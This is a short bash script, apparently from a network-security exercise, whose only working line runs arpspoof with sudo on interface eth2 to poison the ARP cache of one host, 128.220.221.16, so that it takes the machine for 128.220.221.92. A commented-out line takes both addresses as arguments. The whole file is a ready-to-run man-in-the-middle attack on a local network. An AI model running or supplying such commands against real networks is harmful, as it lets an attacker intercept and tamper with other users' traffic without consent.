#! /bin/bash

sudo arpspoof -i eth2 -t 128.220.221.16 128.220.221.92

# sudo arpspoof -i eth2 -t "$1" "$2"

